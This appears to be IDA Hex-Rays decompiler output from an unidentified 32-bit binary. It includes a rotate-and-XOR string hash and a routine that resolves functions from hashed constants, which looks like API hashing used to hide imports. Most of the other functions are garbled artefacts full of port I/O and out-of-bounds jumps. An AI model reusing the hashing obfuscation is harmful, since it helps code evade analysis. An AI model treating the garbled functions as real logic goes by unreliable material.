void __usercall sub_406E8A(int a1@<ebx>, int a2@<edi>)
{
  int v2; // eax
  int v3; // esi
  int v4; // edx
  int v5; // kr00_4
  int v6; // edi
  char *v7; // eax
  char *v8; // eax
  unsigned int v9; // eax
  int v10; // ecx
  unsigned int v11; // edx
  int v12; // edi
  char *v13; // eax
  char *v14; // eax
  int v15; // [esp-4h] [ebp-4h]

  dword_4431DC -= a2;
  v13 = sub_4061BD(-1462228877);
  dword_443118 = a1;
  dword_44305C = (int)v13;
  v14 = sub_4061BD(-8214577);
  LOBYTE(dword_44312C) = dword_44312C - 39;
  dword_443194 = 21373;
  dword_443068 = (int)v14;
  v8 = sub_4061BD(-1350292379);
  dword_443178 = v15;
  dword_4430B4 = (int)v8;
  LOBYTE(dword_443168) = dword_443168 - 28;
  LOBYTE(dword_4431B4) = dword_4431B4 - 47;
  v9 = (unsigned int)sub_4061BD(-717066844);
  dword_4431F8 = v10;
  dword_44308C = v9;
  v12 = 31361 - dword_4431C8;
  dword_443100 += v9 + v11 - (((v9 | 0x66DB00000000i64) + (unsigned __int64)v11) >> 32);
  dword_44307C = (int)sub_4061BD(646720942);
  LOBYTE(dword_443160) = 93;
  dword_4430D8 = (int)sub_4061BD(-285000678);
  v6 = v12 - 1 + 11557;
  dword_443164 = 22186;
  v7 = sub_4061BD(-1472000846);
  dword_443188 -= v6;
  dword_4430A8 = (int)v7;
  sub_404C01(31619);
  v3 = v2 ^ ((v6 ^ 0x8AB) + 16198) ^ 0x626E;
  dword_4431B0 += 31619;
  dword_443118 += v3;
  v5 = (v4 ^ 0xF81E6) + sub_401330(v3 ^ 0x7B83, v4);
  __asm { retn }
}
// 406902: variable 'v15' is possibly undefined
// 40692A: variable 'v10' is possibly undefined
// 406930: variable 'v11' is possibly undefined
// 404A45: variable 'v2' is possibly undefined
// 404A87: variable 'v4' is possibly undefined
// 44305C: using guessed type int dword_44305C;
// 443068: using guessed type int dword_443068;
// 44307C: using guessed type int dword_44307C;
// 44308C: using guessed type int dword_44308C;
// 4430A8: using guessed type int dword_4430A8;
// 4430B4: using guessed type int dword_4430B4;
// 4430D8: using guessed type int dword_4430D8;
// 443100: using guessed type int dword_443100;
// 443118: using guessed type int dword_443118;
// 44312C: using guessed type int dword_44312C;
// 443160: using guessed type int dword_443160;
// 443164: using guessed type int dword_443164;
// 443168: using guessed type int dword_443168;
// 443178: using guessed type int dword_443178;
// 443188: using guessed type int dword_443188;
// 443194: using guessed type int dword_443194;
// 4431B0: using guessed type int dword_4431B0;
// 4431B4: using guessed type int dword_4431B4;
// 4431C8: using guessed type int dword_4431C8;
// 4431DC: using guessed type int dword_4431DC;
// 4431F8: using guessed type int dword_4431F8;

//----- (00406F40) --------------------------------------------------------
unsigned int __cdecl sub_406F40(_BYTE *a1)
{
  unsigned int result; // eax

  result = 0;
  while ( *a1 )
    result = (char)*a1++ ^ ((result >> 25) | (result << 7));
  return result;
}

//----- (00408F6D) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_408F6D(__int16 _DX@<dx>, int a2@<ebp>, _BYTE *a3@<edi>, int _ESI@<esi>, char a5@<efl>)
{
  HIWORD(_EAX) = 15920;
  _ECX = *(_DWORD *)&a3[_ESI - 11];
  __ES__ = *(_WORD *)&a3[_ESI - 7];
  *(_BYTE *)(a2 + 1942600820) = 0;
  __asm { insd }
  _EDX = 416213438;
  __asm { outsb }
  LOBYTE(_EAX) = -41;
  BYTE1(_EAX) = a5;
  __asm
  {
    arpl    si, dx
    rcl     esi, cl
    aas
  }
  *a3 = _EAX;
  __asm { bound   edx, [esi+76h] }
  if ( a2 == -1 )
  {
    LOBYTE(_EAX) = _EAX ^ 0x97;
    *(_WORD *)(_ESI + 70) = __FS__;
    __asm { retn }
  }
  JUMPOUT(0x682B53D5);
}
// 408F70: positive sp value 8 has been found
// 408FCA: control flows out of bounds to 682B53D5
// 40902F: unbalanced stack, ignored a potential tail call

//----- (0040A86A) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_40A86A(
        __int16 _AX@<ax>,
        _DWORD *_EDX@<edx>,
        int _ECX@<ecx>,
        unsigned int _EBX@<ebx>,
        int a5@<ebp>,
        int a6@<edi>,
        int a7@<esi>)
{
  int v7; // esi
  _DWORD *v9; // ebp
  _DWORD *v10; // et0
  unsigned int v11; // eax
  int v15; // esi
  int v16; // edi

  __asm { rcr     dword ptr [edx], cl }
  LOBYTE(_EBX) = *(_BYTE *)(a7 + _EBX);
  HIBYTE(_AX) = 96;
  __outbyte((unsigned __int16)_EDX, _AX);
  v15 = a7 + 4;
  v16 = *(_DWORD *)(a6 + 47) | (a6 + 4);
  _ZF = a5 + *_EDX == 0;
  *_EDX += a5;
  *(_BYTE *)(_ECX + 600567755) = __ROL1__(*(_BYTE *)(_ECX + 600567755), 1);
  if ( !_ZF )
  {
    __asm { icebp }
    __outdword((unsigned __int16)_EDX, _AX);
    __asm { aaa }
    __halt();
  }
  HIWORD(v11) = -21611;
  v7 = v15 + 1;
  LOBYTE(v11) = __inbyte((unsigned __int16)_EDX);
  BYTE1(v11) = BYTE1(_ECX) | 0x9B;
  __asm { insb }
  v10 = _EDX;
  _DX = -12816;
  v9 = v10;
  LOBYTE(v11) = *(_BYTE *)(v16 + 1557561147) & (v11 + 11);
  MEMORY[0xC2AEFF73] = v11;
  _enable();
  _ZF = (_ECX & 0x4000) != 0;
  _ECX = _ECX - 1;
  if ( _ZF || !_ECX )
  {
    _AL = 72;
    *((_BYTE *)v9 - 51) = ~*((_BYTE *)v9 - 51);
    *(_BYTE *)(_ECX - 529733845) ^= 0x22u;
    __asm { xlat }
    JUMPOUT(0x40A81B);
  }
  *(_DWORD *)(v7 + 814324727) = (__PAIR64__(*(_DWORD *)(v7 + 814324727), v11) - __PAIR64__(_EBX, -1343958305)) >> 32;
  LOBYTE(v11) = __inbyte(0x71u);
  LOBYTE(v11) = v11 + 60;
  __outbyte(0xCDF0u, v11);
  _ZF = (*(_BYTE *)(v11 + 90) & 0x3C) == 0;
  *(_BYTE *)(v11 + 90) &= 0x3Cu;
  __asm { insd }
  HIBYTE(_DX) = 123;
  if ( _ZF )
  {
    __asm
    {
      insd
      repne dec ecx
    }
    __halt();
  }
  JUMPOUT(0x40A862);
}
// 40A898: positive sp value 4 has been found
// 40A811: control flows out of bounds to 40A812
// 40A819: control flows out of bounds to 40A81B
// 40A867: control flows out of bounds to 40A869
// 40A8CC: control flows out of bounds to 40A862
// 40A88C: conditional instruction was optimized away because zf.1==0

//----- (0040AF54) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall __noreturn sub_40AF54(int a1@<eax>, __int16 _DX@<dx>, int a3@<ecx>, _BYTE *a4@<edi>, _BYTE *a5@<esi>)
{
  double v7; // st7
  _BYTE *v8; // esi
  double v9; // st7
  bool v15; // cf
  char v16; // cl
  bool v17; // zf
  int v18; // ecx
  int v19; // ecx
  unsigned int v22; // [esp-Ch] [ebp-Ch]
  __int16 v23; // [esp-4h] [ebp-4h]

  _EAX = a1 | 0x7C0961C6;
  LOBYTE(_EAX) = __inbyte(0x93u);
  __asm { insd }
  *a4 = *a5;
  v7 = (double)*(int *)(5 * _EAX + 0x626BF872);
  __debugbreak();
  v8 = a5 + 2;
  LOBYTE(a3) = 35;
  v9 = v7 / (double)*(int *)&v8[4 * a3 - 39];
  LOBYTE(_EAX) = MEMORY[0x9598067A];
  v8[74] = 35;
  _EDI = a4 + 6;
  __asm
  {
    icebp
    aaa
  }
  __writeeflags(v22);
  MEMORY[0x4686B6DD](1748262617, v9);
  MEMORY[0x8A46E678]();
  __asm
  {
    insb
    into
  }
  _DX = v23;
  __asm { insd }
  LOBYTE(v18) = v16 - (v15 + 63);
  v17 = v16 == 0;
  v19 = v18 - 1;
  if ( v17 )
  {
    if ( v19 )
    {
      *(_WORD *)(v19 + 1197567221) = __FS__;
      _RAX = MEMORY[0x61CC0B74]();
      __asm { rcr     dword ptr [edi-0D88E047h], cl }
      --_ECX;
      v15 = __CFADD__(BYTE1(_ECX), (_BYTE)_RAX);
      LODWORD(_RAX) = _ECX;
      __asm { lock out dx, eax }
      __outdword(WORD2(_RAX), _ECX);
      MEMORY[0xBCD1D8C4] += BYTE1(_ECX) + v15;
      __outbyte(WORD2(_RAX), _ECX);
      __inbyte(0x1Au);
      __halt();
    }
  }
  JUMPOUT(0x5AEB294);
}
// 40AFA4: positive sp value C has been found
// 40AFB4: control flows out of bounds to 5AEB294
// 40AF8A: variable 'v22' is possibly undefined
// 40AFA3: variable 'v23' is possibly undefined
// 40AFAA: variable 'v16' is possibly undefined
// 40AFAA: variable 'v15' is possibly undefined
// 40AFAD: variable 'v18' is possibly undefined
// 40AFDB: variable '_ECX' is possibly undefined

//----- (0040B376) --------------------------------------------------------
__int64 __userpurge sub_40B376@<edx:eax>(
        int a1@<ebx>,
        int a2@<ebp>,
        int a3@<edi>,
        double a4@<st0>,
        char a5@<efl>,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17,
        int a18,
        int a19,
        int a20,
        int a21,
        int a22,
        int a23,
        int a24,
        int a25,
        int a26,
        int a27,
        int a28,
        int a29,
        int a30,
        int a31,
        int a32,
        int a33,
        int a34,
        int a35,
        int a36,
        int a37,
        int a38,
        int a39,
        int a40,
        int a41,
        int a42,
        int a43,
        int a44,
        int a45,
        int a46,
        int a47,
        int a48,
        int a49,
        int a50,
        int a51,
        int a52,
        int a53,
        int a54,
        int a55,
        int a56,
        int a57,
        int a58,
        int a59,
        int a60,
        int a61,
        int a62,
        int a63)
{
  char v64; // cf
  bool v65; // zf
  bool v66; // sf
  char v67; // of
  bool v68; // pf
  __int64 result; // rax

  *(double *)(a2 + 25) = a4;
  v64 = 0;
  v67 = 0;
  v65 = (a1 & *(_DWORD *)(a3 - 1176969972)) == 0;
  v68 = __SETP__(a1 & *(_DWORD *)(a3 - 1176969972), 0);
  v66 = (a1 & *(_DWORD *)(a3 - 1176969972)) < 0;
  *(_DWORD *)(a3 - 1176969972) &= a1;
  BYTE1(result) = a5;
  return result;
}
// 40B376: too many input arguments, some ignored

//----- (0040B5E5) --------------------------------------------------------
void sub_40B5E5()
{
  __indword(0xCFu);
  __asm { iret }
}
// 40B5EC: control flows out of bounds to 40B5ED

//----- (0040B874) --------------------------------------------------------
void __usercall sub_40B874(int a1@<eax>)
{
  BYTE1(a1) = 57;
  MEMORY[0x6515CF56] = a1;
  JUMPOUT(0x40B821);
}
// 40B81E: control flows out of bounds to 40B821

//----- (0040CD0A) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __userpurge sub_40CD0A@<eax>(
        _BYTE *a1@<eax>,
        int a2@<edx>,
        unsigned int _EBX@<ebx>,
        int a4@<ebp>,
        __int32 _EDI@<edi>,
        int a6@<esi>,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17,
        int a18,
        int a19,
        int a20,
        int a21,
        int a22,
        int a23,
        int a24,
        int a25,
        int a26,
        int a27,
        int a28,
        int a29,
        int a30,
        int a31,
        int a32,
        int a33,
        int a34,
        int a35,
        int a36,
        int a37,
        int a38,
        int a39,
        int a40,
        int a41,
        int a42,
        int a43,
        int a44,
        int a45,
        int a46,
        int a47,
        int a48,
        int a49,
        int a50,
        int a51,
        int a52,
        int a53,
        int a54,
        int a55,
        int a56,
        int a57,
        int a58,
        int a59,
        int a60,
        int a61,
        int a62,
        int a63)
{
  int result; // eax
  _BYTE *v65; // et0
  bool v66; // cf

  BYTE1(a2) = *(_BYTE *)(_EBX + 462316601) + __CFSHL__(BYTE1(a2), -48) + __ROL1__(BYTE1(a2), 208);
  *a1 += BYTE1(a2);
  __asm { fldenv  byte ptr [edi+ebx*8] }
  LOBYTE(_EBX) = 109;
  LOBYTE(a1) = __inbyte(a2);
  _disable();
  LOBYTE(a1) = *(_BYTE *)_EBX & (unsigned __int8)a1;
  v65 = a1;
  result = a6;
  v66 = *(_DWORD *)(a6 + 46) < _EBX;
  *(_DWORD *)(a6 + 46) -= _EBX;
  _InterlockedExchange((volatile __int32 *)(v65 - 14), _EDI);
  *(_DWORD *)(a2 + 40) += a4 + v66;
  return result;
}
// 40CD1B: positive sp value 4 has been found
// 40CD0A: too many input arguments, some ignored

// nfuncs=44 queued=44 decompiled=44 lumina nreq=0 worse=0 better=0
// ALL OK, 44 function(s) have been successfully decompiled
